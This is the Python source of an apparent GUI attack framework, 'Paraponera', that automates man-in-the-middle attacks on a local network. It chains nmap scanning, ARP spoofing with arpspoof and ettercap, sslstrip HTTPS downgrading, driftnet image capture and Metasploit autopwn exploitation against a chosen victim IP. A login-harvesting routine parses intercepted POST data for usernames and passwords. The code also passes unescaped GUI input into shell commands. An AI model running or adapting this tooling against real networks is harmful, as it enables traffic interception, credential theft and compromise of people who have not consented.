#!/usr/bin/python
# -*- coding: utf-8 -*- 

######################################################################
#						PARAPONERA
#					    FRAMEWORK
#
#	Author: Bl4ck5w4n     Blog: http://bl4ck5w4n.blogspot.com
#   Twitter: @Bl4ck5w4n   Mail: bl4ck5w4n5@gmail.com	
#
######################################################################

import pygtk, gtk, gtk.glade, locale, time
import socket, struct, os,sys,array, fcntl
import webkit
import glob
import subprocess, commands
import signal                       
from threading import Thread
import pexpect
import gobject
from time import sleep
from config import *


gtk.gdk.threads_init()

encoding = locale.getpreferredencoding()
utf8conv = lambda x : unicode(x, encoding).encode('utf8')

def get_version():
	version = commands.getoutput('git log --abbrev-commit --max-count=1 | grep -i "commit"').split(' ')[1]
	return version


class Messages(gtk.Window): 
  
    def msg_info(self, msg):
        msgbox = gtk.MessageDialog(self, 
            gtk.DIALOG_DESTROY_WITH_PARENT, gtk.MESSAGE_INFO, 
            gtk.BUTTONS_CLOSE, msg)
        msgbox.run()
        msgbox.destroy()
        
    
    def msg_error(self,msg):
        msgbox = gtk.MessageDialog(self, 
            gtk.DIALOG_DESTROY_WITH_PARENT, gtk.MESSAGE_ERROR, 
            gtk.BUTTONS_CLOSE,msg)
        msgbox.run()
        msgbox.destroy()
    
    
    
    def msg_question(self, msg,func):
        msgbox = gtk.MessageDialog(self, 
            gtk.DIALOG_DESTROY_WITH_PARENT, gtk.MESSAGE_QUESTION, 
            gtk.BUTTONS_YES_NO, msg)
        resp = msgbox.run()       
        msgbox.destroy()
        if resp == gtk.RESPONSE_YES:
			 eval(func)
			     
    
    def msg_warnnig(self, msg):
        msgbox = gtk.MessageDialog(self, 
            gtk.DIALOG_DESTROY_WITH_PARENT, gtk.MESSAGE_WARNING, 
            gtk.BUTTONS_CLOSE, msg)
        msgbox.run()
        msgbox.destroy()
        
        
class splashScreen():     
    def __init__(self):
        
        self.window = gtk.Window(gtk.WINDOW_TOPLEVEL)
        self.window.set_decorated(False)
        self.window.set_title('Paraponera')
        self.window.set_position(gtk.WIN_POS_CENTER)
        main_vbox = gtk.VBox(False, 1) 
        self.window.add(main_vbox)
        hbox = gtk.HBox(False, 0)
        self.lbl = gtk.Label("V.: " + get_version())
        self.lbl.set_alignment(0.6, 0.5)
        pixbufanim = gtk.gdk.PixbufAnimation(os.getcwd() +"/res/paraponera.png")
        self.image = gtk.Image()
        self.image.set_from_animation(pixbufanim)
        self.image.show()
        main_vbox.pack_start(self.image, True, True)
        main_vbox.pack_start(self.lbl, True, True)
        self.window.show_all()
        

        
class paraponera (object):

	def __init__(self):
		
		
		
		self.builder = gtk.Builder()
		self.builder.add_from_file("res/paraponera_ui.glade")


		self.ip_victim = ''
				
		self.request_file = '/tmp/paraponera.log'
		
		self.filter_type = ''

		
		self.gateway_txt = self.builder.get_object("gateway_txt")
		self.filter_gateway_txt = self.builder.get_object("filter_gateway_txt")
		self.filter_target_txt = self.builder.get_object("filter_target_txt")
		self.interface_txt = self.builder.get_object("interface_txt")
		self.manual_txt = self.builder.get_object("manual_txt")
		self.autopwn_ip_txt = self.builder.get_object("autopwn_ip_txt")
		self.exploit_txt = self.builder.get_object("exploit_txt")
		self.filter1_txt = self.builder.get_object("filter1_txt")
		self.filter2_txt = self.builder.get_object("filter2_txt")
		self.lhostautopwd_txt = self.builder.get_object("lhostautopwd_txt")
		self.uriautopwd_txt = self.builder.get_object("uriautopwd_txt")
		
		
		
		self.filter_ch= self.builder.get_object("filter_ch")
		self.filter_ch.set_current_folder(os.getcwd() +"/filters")
		
		
		
		self.filter1_lb = self.builder.get_object("filter1_lb")
		self.filter2_lb = self.builder.get_object("filter2_lb")
		self.filter_lb = self.builder.get_object("filter_lb")
		self.version_lb = self.builder.get_object("version_lb")
		self.version_lb.set_label('<b>Version: </b>' + get_version())
		
		self.exploit_txt.modify_base(gtk.STATE_NORMAL,gtk.gdk.color_parse('#000000'))
		self.exploit_txt.modify_text(gtk.STATE_NORMAL,gtk.gdk.color_parse('#FFFFFF'))

		self.sniff_bt = self.builder.get_object("sniff_bt")
		self.stop_bt = self.builder.get_object("stop_bt")
		self.filter_start_bt = self.builder.get_object("filter_start_bt")
		self.images_bt = self.builder.get_object("images_bt")
		self.manual_bt = self.builder.get_object("manual_bt")
		self.autopwn_bt = self.builder.get_object("autopwn_bt")
		self.get_password_bt = self.builder.get_object("get_password_bt")
		self.images_refresh_bt = self.builder.get_object("images_refresh_bt")
		self.bautopwn_bt = self.builder.get_object("bautopwn_bt")
		
		
		self.scrollimages = self.builder.get_object("scrolledwindow2")
		self.scrollcomputers = self.builder.get_object("scrolledwindow1")
		self.password_scroll = self.builder.get_object("password_scroll")

		self.attack_image = gtk.gdk.pixbuf_new_from_file(os.getcwd() +"/res/paraponera-ico.png")
		self.pixbuf = gtk.CellRendererPixbuf();

		self.liststore = gtk.ListStore(str,str,gtk.gdk.Pixbuf)
		self.treeview = gtk.TreeView(self.liststore)



		self.treeview.add_events(gtk.gdk.BUTTON_PRESS_MASK)
		self.treeview.connect('button_press_event', self.selectComputer)

		self.column_IP = gtk.TreeViewColumn("IP")
		self.treeview.append_column(self.column_IP)
		self.column_COMPUTER = gtk.TreeViewColumn("COMPUTER")
		self.treeview.append_column(self.column_COMPUTER)
		#self.column_OS = gtk.TreeViewColumn("OS")
		#self.treeview.append_column(self.column_OS)
		self.column_ATTACK = gtk.TreeViewColumn("ATTACK")
		self.treeview.append_column(self.column_ATTACK)
	
		self.cell = gtk.CellRendererText()
		self.cell_image = gtk.CellRendererPixbuf()
			
		self.column_IP.pack_start(self.cell, False)
		self.column_IP.add_attribute(self.cell, "text", 0)

		self.column_COMPUTER.pack_start(self.cell, False)
		self.column_COMPUTER.add_attribute(self.cell, "text", 1)

		#self.column_OS.pack_start(self.cell, False)
		#self.column_OS.add_attribute(self.cell, "text", 2)

		self.column_ATTACK.pack_start(self.cell_image, expand=False)
		self.column_ATTACK.add_attribute(self.cell_image,'pixbuf', 2)

		
		self.scrollcomputers.add(self.treeview)
		
		self.password_txt = webkit.WebView()
		self.password_scroll.add(self.password_txt)
		

		self.view = webkit.WebView()
		self.scrollimages.add(self.view)

		
		self.builder.connect_signals(self)


	def run(self):
	
		self.builder.get_object("window1").show_all()
		try:
			self.gateway_txt.set_text(self.get_gateway())
			self.filter_gateway_txt.set_text(self.get_gateway())
			
		except:
			pass
		
		try:
			self.interface_txt.set_text(self.get_interface()[1][0])
		except:
			pass
		
		
		try:
			self.lhostautopwd_txt.set_text(str(self.get_ip()[0]))
		except:
			pass
			
		self.filter1_txt.set_visible(False)
		self.filter2_txt.set_visible(False)
		self.filter1_lb.set_visible(False)
		self.filter2_lb.set_visible(False)	
		
		self.check_paths()
		self.check_update()
		gtk.main()



		
	def check_paths(self):
		error_msg = ''
		
		if (os.path.isfile(sslstrip_path) == False):
			error_msg = 'sslstrip, ' 
		if  (os.path.isfile(arpspoof_path) == False):
			error_msg = error_msg +'arpspoof, '
		if (os.path.isfile(driftnet_path) == False):
			error_msg = error_msg + 'driftnet, ' 
		if (os.path.isfile(msfconsole_path) == False):
			error_msg = error_msg + 'msfconsole, ' 
		if (os.path.isfile(ettercap_path) == False):
			error_msg = error_msg + 'ettercap, '
			
		if (error_msg):
			Messages().msg_error('You dont have ' + error_msg + ' installed or you need to correct the paths in config.py')
	
	def check_update(self):
		os.system('git fetch origin')
		new_update = commands.getoutput("git rev-list HEAD...origin/master --count")
		
		
		if (new_update != '0'):
			func = 'paraponera().update()'
			Messages().msg_question('There is a new version of Paraponera! Would you like to update?',func)
		
		
	def update(self):
		os.system('git pull https://code.google.com/p/paraponera/')
		os.system("bash install.sh")
		python = sys.executable
		os.execl(python, python, * sys.argv)
		
	def reset_init(self):
		#os.system('iptables --flush &') 			
		#os.system('iptables --table nat --flush &') 			
		#os.system('iptables --delete-chain &') 			
		#os.system('iptables --table nat --delete-chain &')
		
		try:
			os.system('rm ' + os.getcwd()+'/*.pcap') 
			os.system('rm ' + os.getcwd()+'/*.txt')
			os.system('rm ' + os.getcwd()+'/images/*.*')
		except:
			pass

		
		self.terminate_pid()
				   
	def terminate_pid(self):
		
		pidof = ['ettercap','postgresql','driftnet','sslstrip','arpspoof','msfconsole']
		for p in pidof:
			proc = subprocess.Popen(["pgrep", p], stdout=subprocess.PIPE) 

			
			for pid in proc.stdout:
				os.kill(int(pid), signal.SIGKILL)
				
				try: 
				   os.kill(int(pid), 0)
				  
				except OSError as ex:
				   continue 			   


	def get_range(self):
		
		gateway = self.gateway_txt.get_text().split('.')
		return gateway[0] + '.' + gateway[1] + '.' + gateway[2] + '.0/24'


	def sslstrip(self):
		os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 &')
		os.system(sslstrip_path + ' -f -a -k -l 8080 -w ' + self.request_file +' &')
		
		
	def arpspoof(self):
		os.system(arpspoof_path + ' -i ' + self.interface_txt.get_text() + ' -t '+ self.gateway_txt.get_text() +' ' +self.ip_victim)
		

	def ettercap(self):
		os.system('ettercap -o -q -T -M arp -i ' +self.interface_txt.get_text() + ' /' + self.ip_victim  + '/ /' + self.gateway_txt.get_text() +'/ &')
		

	def driftnet(self):
		os.system(driftnet_path + ' -i '+self.interface_txt.get_text() +' -p -a -d ' + os.getcwd() +'/images/ &')	

	def get_interface(self):
	    is_64bits = sys.maxsize > 2**32
	    struct_size = 40 if is_64bits else 32
	    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	    max_possible = 8 # initial value
	    while True:
		bytes = max_possible * struct_size
		names = array.array('B', '\0' * bytes)
		outbytes = struct.unpack('iL', fcntl.ioctl(
		    s.fileno(),
		    0x8912,  # SIOCGIFCONF
		    struct.pack('iL', bytes, names.buffer_info()[0])
		))[0]
		if outbytes == bytes:
		    max_possible *= 2
		else:
		    break
	    namestr = names.tostring()
	    return [(namestr[i:i+16].split('\0', 1)[0],
		     socket.inet_ntoa(namestr[i+20:i+24]))
		    for i in range(0, outbytes, struct_size)]


	
	def exploit(self):
		textbuffer = self.exploit_txt.get_buffer()
		os.system('service postgresql start &')
		filewrite=file("autopwn", "w")
		filewrite.write("load "+ os.getcwd() +"/mods/db_autopwn.rb\r\n")
		filewrite.write("db_nmap "+ self.ip_victim +"\r\n")
		filewrite.write("db_autopwn -p -t -e -r\r\n")
		filewrite.write("jobs -K\r\n")
		filewrite.write("sessions -l\r\n")
		filewrite.close()
		#time.sleep(2)
		os.system('xterm -T "EXPLOIT" -e ' + msfconsole_path + ' -r autopwn &')
		



	def read_output(self,buffer,view,command):
	     	
	     stdin, stdouterr = os.popen4(command)
	     while 1:
		 line = stdouterr.readline()
		 if not line:
		     break
		 gtk.gdk.threads_enter()
		 iter = buffer.get_end_iter()
		 buffer.place_cursor(iter)
		 buffer.insert(iter, utf8conv(line.replace('[1m','').replace('[34m[*]','').replace('[0m','').replace('[31m[-]','')))
		 view.scroll_to_mark(buffer.get_insert(), 0.1)
		 gtk.gdk.threads_leave()

	def list_images(self):
		
		list_images = glob.glob(os.getcwd() +"/images/*")
		
		self.view.load_string('<center><b>Loading Imagens....</b></center>', "text/html", "UTF-8","file:///tmp")	
		self.view.show()
		
		html = ''
		for image in (list_images):
			
			if (image != os.getcwd() +'/images/readme'):
				html = '<img src="' + image + '">' + html
		
		if (html==''):
			html = '<center><small>No images captured yet...</small></center>'


		self.view.load_string(html, "text/html", "UTF-8","file:///tmp")	
		self.view.show()

	def scan_network(self):

	
		
		nmap_scan = commands.getoutput('nmap -sP -PA21,22,25,3389 ' + self.get_range() + ' | grep -i "report" | sed -e s/"Nmap scan report for "/""/g |sed -e s/"("/""/g | sed -e s/")"/""/g')
		nmap_list = nmap_scan.replace('\n',' ').split(' ')

		print nmap_list
		ips = ''
		host = ''
		n = len(nmap_list)
		
		for x in xrange(n):
			if x%2==0:
				try:
					host = nmap_list[x]
					ips = nmap_list[x+1]
				except:
					pass
			
			if ((host != '') and (ips !='')):
				self.liststore.append([ips, host, gtk.gdk.pixbuf_new_from_file(os.getcwd()+'/res/eye_closed.png')])
				
			host = ''
			ips = '' 
			
		
		self.sniff_bt.set_label('Start')
		
	
	def bautopwn_bt_clicked_cb(self,*args):
		os.system('service httpd start')
		os.system('service apache2 start')
		
		textbuffer = self.exploit_txt.get_buffer()
		command = 'echo  " TIP: You can use the Filters (redirect_url or insert_iframe) to redirect all traffic to you"'
		thr = Thread(target= self.read_output, args=(textbuffer,self.exploit_txt, command))
		thr.start()
		os.system('xterm -T "Browser PWN" -e msfcli server/browser_autopwn LHOST='+ self.lhostautopwd_txt.get_text() + ' URIPATH='+ self.uriautopwd_txt.get_text() + ' E &')
		
		
	def stop_bt_clicked_cb(self,*args):
		self.terminate_pid()
		
		self.manual_bt.set_label('Sniff')
		for row in self.liststore:
			self.liststore.set_value(row.iter,2,gtk.gdk.pixbuf_new_from_file(os.getcwd() + '/res/eye_closed.png'))
		
			
	def filter_ch_file_set_cb(self,*args):


		self.filter1_txt.set_visible(False)		
		self.filter1_lb.set_visible(False)
		self.filter2_txt.set_visible(False)		
		self.filter2_lb.set_visible(False)
				
		filter_file = open(self.filter_ch.get_filename(),'r')
		content = filter_file.read()
		filter_info = content.split('||')
		filter_file.close

		
		try:
			author = filter_info[0].replace('# ', '').replace('Author:','<b>Author:</b>')
		except:
			author = 'Author not defined'
		
		try:	
			description  = filter_info[1].replace('# ', '').replace('Description:','<b>Description:</b>')
		except:
			description  = 'Description: None'
		
		try:
			self.filter_type = filter_info[2].replace('# Type: ', '').replace('\n','').replace(' ','') # You need to have Type in your filter file
			
			if (self.filter_type == "Single"):	
				self.filter1_lb.set_label('Replace: ')
				self.filter1_txt.set_visible(True)		
				self.filter1_lb.set_visible(True)
			
			
			if (self.filter_type == "Multiple"):	
				self.filter1_lb.set_label('Replace: ')
				self.filter1_txt.set_visible(True)		
				self.filter1_lb.set_visible(True)
				self.filter2_lb.set_label('With: ')
				self.filter2_txt.set_visible(True)		
				self.filter2_lb.set_visible(True)
			
			
		except:
			Messages().msg_error('This filter has no type, please read de README file in filters folder.')
			author = ''
			description = ''
		
		
		
		self.filter_lb.set_label(author + '\t\n' +description + '\t\n')
		
		
		
		
	def filter_start_bt_clicked_cb(self,args):
		
		proc = subprocess.Popen(["pgrep", 'ettercap'], stdout=subprocess.PIPE) 
		
		for pid in proc.stdout:
			os.kill(int(pid), signal.SIGKILL)
			
			try: 
			   os.kill(int(pid), 0)
			  
			except OSError as ex: 
			   continue 	
			   
		filename = '/tmp/' +  self.filter_ch.get_filename().replace(os.getcwd() + '/filters/','')
		
		if (self.filter_start_bt.get_label() == 'Start Spoofing'):
				original_filter = open(self.filter_ch.get_filename(),'r')
				content = original_filter.read()
				original_filter.close()
				
				
				
						
				if (self.filter_type == "Single"):	
					file_to_compile = open(filename,'w')
					replace_me = content.replace('REPLACE_ME',self.filter1_txt.get_text())
					file_to_compile.write(replace_me)
					file_to_compile.close()
					os.system('etterfilter ' + filename +' -o ' + filename +'.ef')
					
				if (self.filter_type == "Multiple"):
					file_to_compile = open(filename,'w')
					replace_me = content.replace('REPLACE_ME',self.filter1_txt.get_text()).replace('WITH_ME',self.filter2_txt.get_text())
					file_to_compile.write(replace_me)
					file_to_compile.close()
					os.system('etterfilter ' + filename +' -o ' + filename +'.ef')
					
				if (self.filter_type == "None"):
					os.system('etterfilter ' + self.filter_ch.get_filename() +' -o '+ filename +'.ef') 
				
				
				
				
				os.system("echo 1 > /proc/sys/net/ipv4/ip_forward &")
				
				#WE append :1 to end of file because ettercap has a bug #84
				os.system('ettercap -Tqi '+ self.interface_txt.get_text() +' --mitm arp:remote /'+ self.filter_target_txt.get_text() +'/ /'+ self.filter_gateway_txt.get_text() +'/ -P autoadd -F ' + filename +'.ef:1 &')
				
				self.filter_start_bt.set_label('Stop Spoofing')
		else:
			try:
				os.remove(filename)
			except:
				pass
			try:
				os.remove(filename + '.ef' )
			except:
				pass
			
			
			self.filter_start_bt.set_label('Start Spoofing')
			

		

	def images_refresh_bt_clicked_cb(self, *args):
		self.list_images()


	def autopwn_bt_clicked_cb(self, *args):
		self.ip_victim = self.autopwn_ip_txt.get_text()
		self.filter_target_txt.set_text(self.ip_victim)
		if (self.ip_victim != ''):
			start_autopwn = Thread(target=self.exploit)
			start_autopwn.start()


	def manual_bt_clicked_cb(self, *args):
		self.ip_victim = self.manual_txt.get_text()
		self.filter_target_txt.set_text(self.ip_victim)
		if (self.ip_victim != ''):
			self.manual_bt.set_label('Sniffing...')
			self.start_sniffing()
	
	def get_password_bt_clicked_cb(self, *args):

		logins = ''
		
		with open(self.request_file) as f:
			for n,line in enumerate(f,1): 
				if "POST Data" in line:
					website = line.replace('(',' ').replace(')',' ').split()
					
					if (website[3] == 'Data'):
						
						logins = logins + 'Domain: ' + website[4] + '<br />'
					else:
						
						logins = logins + 'Domain: ' + website[5] + '<br />'
					request = ''.join(open(self.request_file, 'r').readlines()[n])
								
					
					
					for u in user_list:
						if u in request:
							try:
								user = request.split(u+'=')[1]
								user = user.split('&')
								user = user[0].replace('%40','@')
								logins = logins +'User: ' + user + '<br />'
							except:
								pass

					for p in password_list:
						if p in request:
							try:
								password = request.split(p+'=')[1]
								password = password.split('&')
								logins = logins + 'Password: ' + password[0] + '<br />'
							except:
								pass
					logins = logins + '<hr>'
			if (logins == ''):
				logins = '<center><small>No passwords captured... <br /> Be Patient </small></center>' 
		
		self.password_txt.load_string(logins, "text/html", "UTF-8","file:///tmp")	
		self.password_txt.show()	

	def sniff_bt_clicked(self, *args):
						
		self.liststore.clear()
		self.reset_init()
		

		self.sniff_bt.set_label('Scanning')

		
		t = Thread(target=self.scan_network)
    		t.start()
		
	def start_sniffing(self):
		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
				
		self.autopwn_ip_txt.set_text(self.ip_victim)
		
		self.start_sslstrip = Thread(target=self.sslstrip)
		self.start_sslstrip.start()
		
		self.start_arpspoof = Thread(target=self.arpspoof)
		self.start_arpspoof.start()
			
		self.start_ettercap = Thread(target=self.ettercap)
		self.start_ettercap.start()
		
		self.start_driftnet = Thread(target=self.driftnet)
		self.start_driftnet.start()	
		
	

	def selectComputer(self, widget, event):
			if event.button == 1 and event.type == gtk.gdk._2BUTTON_PRESS:
			        treeselection = self.treeview.get_selection()
			        (model, iter) = treeselection.get_selected()
			        self.ip_victim = self.liststore.get_value(iter, 0)
			        self.filter_target_txt.set_text(self.ip_victim)
			    	for row in self.liststore:
						self.liststore.set_value(row.iter,2,gtk.gdk.pixbuf_new_from_file(os.getcwd() + '/res/eye_closed.png'))
				self.liststore.set_value(iter,2,gtk.gdk.pixbuf_new_from_file(os.getcwd() + '/res/eye.png'))
				
				self.start_sniffing()
								

				

			       


	def get_ip(self, *args):
	    file=os.popen("ifconfig | grep 'addr:'")
	    data=file.read()
	    file.close()
	    bits=data.strip().split('\n')
	    addresses=[]
	    for bit in bits:
		if bit.strip().startswith("inet "):
		    other_bits=bit.replace(':', ' ').strip().split(' ')
		    for obit in other_bits:
			if (obit.count('.')==3):
			    if not obit.startswith("127."):
			        addresses.append(obit)
			    break
	    return addresses

	def get_gateway(self, *args):

	    with open("/proc/net/route") as fh:
		for line in fh:
		    fields = line.strip().split()
		    if fields[1] != '00000000' or not int(fields[3], 16) & 2:
		        continue

		    return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))

	def on_close(self, *args):
		self.reset_init()
		gtk.main_quit()

        
if __name__ == "__main__":
    splScr = splashScreen()
        
    while gtk.events_pending():
        gtk.main_iteration()
    
    sleep(3) 
    
    
    splScr.window.destroy()
    
    if not os.geteuid()==0:
		Messages().msg_error('Sorry you must be root to run Paraponera!')
		sys.exit(1)
		
    paraponera().run()

